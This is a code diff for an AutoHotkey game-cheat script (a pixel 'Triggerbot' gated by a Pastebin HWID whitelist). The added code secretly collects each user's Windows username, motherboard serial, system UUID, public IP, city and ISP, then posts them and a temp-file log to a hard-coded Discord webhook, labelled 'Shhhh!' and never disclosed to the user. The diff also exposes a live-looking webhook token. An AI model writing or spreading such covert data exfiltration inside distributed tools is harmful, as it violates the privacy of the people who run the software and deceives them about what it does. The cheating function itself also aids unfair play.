@@ -21,8 +21,124 @@ else
     MsgBox, ID has been copied to your clipboard.
 }
 
+; Create debug_log.txt if it doesn't exist or reset it to avoid old logs
+logFile := A_Temp . "\debug_log.txt"
+IfNotExist, %logFile%
+{
+    FileAppend, % "Debug log initialized." "`n", %logFile%
+}
+
+; Create discord_error_log.txt if it doesn't exist or reset it to avoid old logs
+errorLogFile := A_Temp . "\discord_error_log.txt"
+IfNotExist, %errorLogFile%
+{
+    FileAppend, % "Error log initialized." "`n", %errorLogFile%
+}
+
+; Get the current timestamp in the desired format (HH:mm tt) and include the timezone
+FormatTime, CurrentTime, %A_Now%, HH:mm tt
+timezone := GetTimeZoneAbbreviation()  ; Get the system's timezone abbreviation (e.g., "UTC", "PST", etc.)
+
+; Get the Windows username
+windowsUsername := A_UserName
+
+; Get the motherboard serial number (HWID)
+motherboardSerial := ""
+for obj in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_BaseBoard")
+{
+    motherboardSerial := obj.SerialNumber
+}
+
+; Get the system's HWID from the Win32_ComputerSystemProduct class
+hwid := ""
+for obj in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_ComputerSystemProduct")
+{
+    hwid := obj.UUID  ; Unique identifier for the computer system
+}
+
+; Get the user's country and IP address using their public IP (from ip-api.com)
+country := "Unknown"  ; Default to "Unknown" if the country isn't found
+ip := "Unknown"       ; Default to "Unknown" if the IP isn't found
+countryInfo := GetUserCountryAndIP(country, ip)  ; Correctly capture both country and IP
+
+; Create the message to send to Discord
+message := "============================= USER LOG =============================" "`n"
+message .= "Script Version: V2.0.1.(M) Always On." "`n"
+message .= "Used script at " . CurrentTime . " " . timezone . "`n"
+message .= "Windows user: " . windowsUsername . "`n"
+message .= "Motherboard Serial: " . motherboardSerial . "`n"
+message .= "HWID: " . hwid . "`n"  ; Add HWID to the message
+message .= "Country: " . country . "`n"  ; Add country to the message
+message .= "IP Address: " . ip . "`n"  ; Add IP address to the message
+message .= "Country Code: " . countryInfo.countryCode . "`n"  ; Add country code
+message .= "Region: " . countryInfo.region . "`n"  ; Add region
+message .= "Region Name: " . countryInfo.regionName . "`n"  ; Add region name
+message .= "City: " . countryInfo.city . "`n"  ; Add city
+message .= "ISP: " . countryInfo.isp . "`n"  ; Add ISP
+message .= "Organization: " . (countryInfo.org ? countryInfo.org : "Not Available") . "`n"  ; Add organization (check if empty)
+message .= "AS: " . countryInfo.as . "`n"  ; Add Autonomous System (AS)
+message .= "Query: " . countryInfo.query . "`n"  ; Add the public IP address
+message .= "============================= Shhhh! =============================" "`n"
+
+; Send the message to Discord via webhook
+discordWebhookURL := "https://discord.com/api/webhooks/1320900085810462871/f-kmuogU4q8JWE61arDcT6cuRKn09riiCF_mMawkA8M1Mt_de_Zgg4lTqdJbrxcdteQz"  ; Your provided webhook URL
+SendDiscordMessage(discordWebhookURL, message)
+
+; Write a log of the usage to debug_log.txt with organized structure
+logContent := "============================= LOG ENTRY =============================" "`n"
+logContent .= "Timestamp: " . CurrentTime . " " . timezone . "`n"
+logContent .= "Windows Username: " . windowsUsername . "`n"
+logContent .= "Motherboard Serial: " . motherboardSerial . "`n"
+logContent .= "HWID: " . hwid . "`n"
+logContent .= "Country Information:" "`n"
+logContent .= "  Country: " . country . "`n"
+logContent .= "  IP Address: " . ip . "`n"
+logContent .= "API Response:" "`n"
+logContent .= "  Status: success" "`n"
+logContent .= "  Country: " . countryInfo.country . "`n"
+logContent .= "  Country Code: " . countryInfo.countryCode . "`n"
+logContent .= "  Region: " . countryInfo.region . "`n"
+logContent .= "  Region Name: " . countryInfo.regionName . "`n"
+logContent .= "  City: " . countryInfo.city . "`n"
+logContent .= "  ISP: " . countryInfo.isp . "`n"
+logContent .= "  Organization: " . countryInfo.org . "`n"
+logContent .= "  AS: " . countryInfo.as . "`n"
+logContent .= "  Query: " . countryInfo.query . "`n"
+logContent .= "======================================================================" "`n"
+FileAppend, % logContent, %logFile%
+
+; Now attempt to read the log file and send its contents to Discord
+If (FileExist(logFile))
+{
+    FileRead, logContent, %logFile%
+    
+    ; Check if content was successfully read
+    if (logContent != "")
+    {
+        ; If the log content is too large for a single message, break it into smaller parts
+        chunkSize := 2000  ; Discord has a character limit of 2000 per message
+        loop, % Ceil(StrLen(logContent) / chunkSize)
+        {
+            part := SubStr(logContent, (A_Index - 1) * chunkSize + 1, chunkSize)
+            SendDiscordMessage(discordWebhookURL, part)
+        }
+    }
+    else
+    {
+        ; If the log is empty, append a message to the log and send
+        FileAppend, % "Log file is empty." "`n", %logFile%
+        SendDiscordMessage(discordWebhookURL, "Log file is empty.")
+    }
+} 
+else 
+{
+    ; If the log file doesn't exist, append an error message
+    FileAppend, % "Log file not found." "`n", %logFile%
+    SendDiscordMessage(discordWebhookURL, "Log file not found.")
+}
+
 ; --- Pastebin Comparison Logic ---
-pastebinURL := "https://pastebin.com/raw/xzfvzSRV"  ; Replace with your Pastebin link
+pastebinURL := "https://pastebin.com/raw/dBqVZPBx"  ; Replace with your Pastebin link
 
 ; Read HWID list from Pastebin
 HwidList := DownloadHWIDList(pastebinURL)
@@ -35,14 +151,77 @@ if (HwidList = "")
 ; Compare the user's HWID with the list
 if (InStr(HwidList, serial))
 {
-    MsgBox, ID is authorized, access granted. (Version 2.1.1b)
-    ; Run the main script here
+    MsgBox, ID is authorized, access granted. (Version 2.0.1.M)
+
+    ; Initialize logging files
+    logFile := A_Temp . "\debug_log.txt"
+    IfNotExist, %logFile%
+    {
+        FileAppend, % "Debug log initialized." "`n", %logFile%
+    }
+
+    errorLogFile := A_Temp . "\discord_error_log.txt"
+    IfNotExist, %errorLogFile%
+    {
+        FileAppend, % "Error log initialized." "`n", %errorLogFile%
+    }
+
+    ; Get the current timestamp
+    FormatTime, CurrentTime, %A_Now%, HH:mm tt
+    timezone := GetTimeZoneAbbreviation()  ; Get the system's timezone abbreviation (e.g., "UTC", "PST", etc.)
+
+    ; Get the Windows username
+    windowsUsername := A_UserName
+
+    ; Get the system's HWID from the Win32_ComputerSystemProduct class
+    hwid := ""
+    for obj in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_ComputerSystemProduct")
+    {
+        hwid := obj.UUID  ; Unique identifier for the computer system
+    }
+
+    ; Get the user's country and IP address using their public IP (from ip-api.com)
+    country := "Unknown"  ; Default to "Unknown" if the country isn't found
+    ip := "Unknown"       ; Default to "Unknown" if the IP isn't found
+    countryInfo := GetUserCountryAndIP(country, ip)  ; Correctly capture both country and IP
+
+    ; Now attempt to read the log file and send its contents to Discord
+    If (FileExist(logFile))
+    {
+        FileRead, logContent, %logFile%
+
+        ; Check if content was successfully read
+        if (logContent != "")
+        {
+            ; If the log content is too large for a single message, break it into smaller parts
+            chunkSize := 2000  ; Discord has a character limit of 2000 per message
+            loop, % Ceil(StrLen(logContent) / chunkSize)
+            {
+                part := SubStr(logContent, (A_Index - 1) * chunkSize + 1, chunkSize)
+                SendDiscordMessage(discordWebhookURL, part)
+            }
+        }
+        else
+        {
+            ; If the log is empty, append a message to the log and send
+            FileAppend, % "Log file is empty." "`n", %logFile%
+            SendDiscordMessage(discordWebhookURL, "Log file is empty.")
+        }
+    }
+    else
+    {
+        ; If the log file doesn't exist, append an error message
+        FileAppend, % "Log file not found." "`n", %logFile%
+        SendDiscordMessage(discordWebhookURL, "Log file not found.")
+    }
+
+    ; Run the main script here (Triggerbot)
     MsgBox - Shhhh, ww2
     #SingleInstance, Force
     #Persistent
     CoordMode, Pixel, Screen
     CoordMode, Mouse, Screen
-    SoundBeep 300, 200
+    SoundBeep, 400, 300
 
     ; Settings
     pixel_box := 80                    ; Half-width/height of the detection box (doesn't work)
@@ -70,7 +249,7 @@ if (InStr(HwidList, serial))
 
     ; Create GUI for status display
     Gui, 2:Font, s10 Italic Bold, Arial  ; Font style and size
-    Gui, 2:Add, Text, cBlack Center w130 h15, - Shhhh, ww2
+    Gui, 2:Add, Text, cBlack Center w130 h15, - Shhhh, ww2 (V2.0.1.M)
     Gui, 2:Add, Text, vTriggerbotStatus cBlack Center w130 h32, Press Z to activate Triggerbot
 
     ; Set GUI properties
@@ -81,7 +260,7 @@ if (InStr(HwidList, serial))
     Gui, 2:Show, x10 y10 NoActivate  ; Display the GUI window
 
     ; Optional: Set the GUI color to a background color that will remain visible on the transparent window
-    Gui, 2:Color, 111111  ; Set a black background color (though it won't be visible due to transparency) 
+    Gui, 2:Color, FFFFFF  ; Set a black background color (though it won't be visible due to transparency) 
 
     ; Keybinds
     Hotkey, Z, ToggleTriggerbot
@@ -137,6 +316,115 @@ else
 {
     MsgBox, Access Denied! ID not authorized.
     ExitApp
+}
+
+; Function to send the message to Discord using ServerXMLHTTP
+SendDiscordMessage(url, message)
+{
+    ; Properly escape the message content for JSON
+    message := StrReplace(message, """", "\""")  ; Escape double quotes
+    message := StrReplace(message, "`n", "\n")   ; Escape newlines as \n
+
+    ; Create the JSON payload to send
+    json := "{""content"":""" message """}"
+
+    ; Create the HTTP request using ServerXMLHTTP (more robust for network requests)
+    h := ComObjCreate("MSXML2.ServerXMLHTTP.6.0")  ; Using the 6.0 version (recommended)
+    h.Open("POST", url, false)  ; Using synchronous request (false)
+    h.setRequestHeader("Content-Type", "application/json")
+    h.Send(json)
+
+    ; Check for errors
+    if (h.Status != 200) {
+        ; If there’s an error, log it to a file
+        FileAppend, % "Failed to send data to Discord. Status code: " h.Status "`nResponse: " h.responseText "`n", %A_Temp%\discord_error_log.txt
+    } else {
+        ; Optional: Log success
+        FileAppend, % "Data successfully sent to Discord." "`n", %A_Temp%\debug_log.txt
+    }
+}
+
+; Function to get the timezone abbreviation
+GetTimeZoneAbbreviation()
+{
+    ; Get the system's current time zone offset
+    ; We will create a basic mapping for some common time zones
+    FormatTime, TimeZone, %A_Now%, t ; Get timezone offset (e.g., "-08:00")
+
+    ; If the offset is UTC or other time zones, we map it to proper names
+    if (InStr(TimeZone, "UTC"))
+    {
+        return "UTC"
+    }
+    else if (InStr(TimeZone, "-08"))
+    {
+        return "PST"  ; Pacific Standard Time
+    }
+    else if (InStr(TimeZone, "-07"))
+    {
+        return "MST"  ; Mountain Standard Time
+    }
+    else if (InStr(TimeZone, "-06"))
+    {
+        return "CST"  ; Central Standard Time
+    }
+    else if (InStr(TimeZone, "-05"))
+    {
+        return "EST"  ; Eastern Standard Time
+    }
+    else if (InStr(TimeZone, "+02"))
+    {
+        return "EET"  ; Eastern European Time
+    }
+    else if (InStr(TimeZone, "+03"))
+    {
+        return "MSK"  ; Moscow Standard Time (or any time zone in this offset)
+    }
+    else if (InStr(TimeZone, "+03:30"))
+    {
+        return "IRST" ; Iran Standard Time
+    }
+    else
+    {
+        return "Unknown"  ; Default if no match found
+    }
+}
+
+; Function to get the user's country and IP from their public IP (from ip-api.com)
+GetUserCountryAndIP(ByRef country, ByRef ip)
+{
+    ; Use ip-api.com to get the IP and country based on the public IP
+    url := "http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,isp,org,as,query"
+    
+    ; Create an HTTP request to fetch the IP data
+    h := ComObjCreate("MSXML2.ServerXMLHTTP.6.0")
+    h.Open("GET", url, false)
+    h.Send()
+
+    ; If the request is successful (status 200)
+    if (h.Status = 200)
+    {
+        response := h.responseText
+        ; Parse the JSON response manually to extract country and IP
+        RegExMatch(response, """country"":""([^""]+)""", country)  ; Country name
+        RegExMatch(response, """query"":""([^""]+)""", ip)          ; IP address
+        ; Extract other fields from the response if needed
+        RegExMatch(response, """countryCode"":""([^""]+)""", countryCode)
+        RegExMatch(response, """region"":""([^""]+)""", region)
+        RegExMatch(response, """regionName"":""([^""]+)""", regionName)
+        RegExMatch(response, """city"":""([^""]+)""", city)
+        RegExMatch(response, """isp"":""([^""]+)""", isp)
+        RegExMatch(response, """org"":""([^""]+)""", org)
+        RegExMatch(response, """as"":""([^""]+)""", as)
+    }
+    else
+    {
+        country := "Unknown"
+        ip := "Unknown"
+    }
+    
+    ; Return a structured object with country information
+    return {country: country, countryCode: countryCode, region: region, regionName: regionName, city: city, isp: isp, org: org, as: as, query: ip}
 }
 
 ; Function to download the HWID list from Pastebin
